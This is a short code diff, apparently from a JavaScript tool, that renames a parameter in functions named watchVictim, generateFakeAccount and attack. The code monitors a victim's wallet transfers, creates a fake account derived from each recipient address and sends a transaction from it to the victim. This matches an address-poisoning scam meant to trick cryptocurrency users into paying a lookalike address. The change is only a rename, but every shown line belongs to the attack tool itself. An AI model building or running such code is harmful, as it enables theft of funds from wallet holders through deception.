@@ -37,7 +37,10 @@ export function watchVictim() {
     (transaction) => {
       if (transaction.input === "0x") {
         console.log(`victim transfer address: ${transaction.to}`);
-        attack({ VICTIM_ADDRESS, transferAddress: transaction.to });
+        attack({
+          victimAddress: VICTIM_ADDRESS,
+          transferAddress: transaction.to,
+        });
       }
     }
   );
@@ -84,7 +87,7 @@ export function generateFakeAccount(transferAddress) {
 }
 
 // attack
-export async function attack({ VICTIM_ADDRESS, transferAddress }) {
+export async function attack({ victimAddress, transferAddress }) {
   const { fakeAddress, fakePrivateKey } = generateFakeAccount(transferAddress);
 
   const publicClient = createPublicClient({
@@ -123,7 +126,7 @@ export async function attack({ VICTIM_ADDRESS, transferAddress }) {
       transport: fallback([http(ALCHEMY_RPC)]),
     });
     const attackHash = await client.sendTransaction({
-      to: VICTIM_ADDRESS,
+      to: victimAddress,
       value: parseEther(send_VALUE),
       gasPrice: adjustedGasPrice,
     });
